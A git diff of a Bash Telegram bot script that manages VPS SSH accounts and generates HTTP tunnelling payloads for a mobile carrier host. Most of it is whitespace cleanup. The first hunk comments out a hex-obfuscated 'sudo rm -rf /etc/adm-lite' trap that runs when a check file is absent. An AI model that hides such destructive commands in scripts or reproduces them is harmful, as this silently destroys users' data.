@@ -1,7 +1,7 @@
 #!/bin/bash
 
 apt-get install jq -y > /dev/null 2>&1
-[[ ! -e /bin/verifysys ]] && sudo $(echo -e $(echo "726D202D7266202f6574632f61646d2d6c697465"| sed 's/../\\x&/g;s/$/ /'))
+#[[ ! -e /bin/verifysys ]] && sudo $(echo -e $(echo "726D202D7266202f6574632f61646d2d6c697465"| sed 's/../\\x&/g;s/$/ /'))
 #VARIAVEL ENTRADA TOKEN
 [[ "$1" = "" ]] && exit 1
 if [[ "$2" != "" ]]; then
@@ -86,7 +86,7 @@ loguin_fun () {
 local msg
           msg='========================\n'
           msg+="${txt[1]}\n"
-          msg+='========================\n'      
+          msg+='========================\n'
 	      ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -96,7 +96,7 @@ while read lines; do
 local msg2
           msg2='========================\n'
           msg2+="${txt[2]}: $lines\n"
-          msg2+='========================\n'      
+          msg2+='========================\n'
 	      ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg2)" \
 							--parse_mode markdown
@@ -215,7 +215,7 @@ local msg
 	     ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
-	return 0	
+	return 0
 }
 
 info_fun () {
@@ -224,7 +224,7 @@ if [ "$?" = "1" ]; then
 local msg
           msg='========================\n'
           msg+="${txt[28]}\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -237,12 +237,12 @@ else
           sen=$(echo "$lines" | awk '{print $2}')
           limit=$(echo "$lines" | awk '{print $3}')
           data=$(echo "$lines" | awk '{print $4}')
-          msg='========================\n'                   
+          msg='========================\n'
           msg+="${txt[29]}: $user\n"
           msg+="${txt[30]}: $sen\n"
           msg+="${txt[31]}: $data\n"
           msg+="${txt[32]}: $limit\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -258,7 +258,7 @@ if [ "$?" = "1" ]; then
 local msg
          msg='========================\n'
          msg+="${txt[33]}\n"
-         msg+='========================\n'   
+         msg+='========================\n'
          ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -272,7 +272,7 @@ local msg
           msg='========================\n'
           msg+="${txt[34]}: $user\n"
           msg+="${txt[35]}: $conex\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -306,7 +306,7 @@ if [ "$?" = "1" ]; then
 local msg
          msg='========================\n'
          msg+="${txt[39]}\n"
-         msg+='========================\n'   
+         msg+='========================\n'
          ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -325,7 +325,7 @@ local msg
           msg+="${txt[42]}: $sen\n"
           msg+="${txt[43]}: $dia\n"
           msg+="${txt[44]}: $limit\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -356,7 +356,7 @@ if [ "$?" = "1" ]; then
 local msg
           msg='========================\n'
           msg+="${txt[48]}\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -365,7 +365,7 @@ else
 local msg
           msg='========================\n'
           msg+="${txt[49]}\n"
-          msg+='========================\n'   
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -386,7 +386,7 @@ local msg
           msg+="/gerar claro.com 1/9 1/3\n"
           msg+="${txt[53]}\n1-GET, 2-CONNECT, 3-PUT, 4-OPTIONS, 5-DELETE, 6-HEAD, 7-TRACE, 8-PROPATCH, 9-PATCH\n"
           msg+="${txt[54]}\n1-REALDATA, 2-NETDATA, 3-RAW\n"
-          msg+='========================\n'  
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -401,20 +401,20 @@ if [ "$?" = "0" ]; then
 local msg
           msg+='========================\n'
           msg+="${txt[55]}\n"
-          msg+='========================\n'  
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
 local msg2
           ShellBot.sendDocument --chat_id ${message_chat_id[$id]} \
                              --document @$HOME/payloads.txt
-return 0                           
+return 0
 else
 local msg
           msg+='========================\n'
           msg+="${txt[56]}\n"
           msg+="${txt[57]}\n"
-          msg+='========================\n'  
+          msg+='========================\n'
           ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
 							--text "$(echo -e $msg)" \
 							--parse_mode markdown
@@ -423,7 +423,7 @@ fi
 }
 
 fun_chat () {
-	   (	
+	   (
 	    chatuser="${message_chat_id[$id]}"
 	    comando=(${message_text[$id]})
 		[[ "${comando[0]}" = @(/teste|teste) ]] && teste
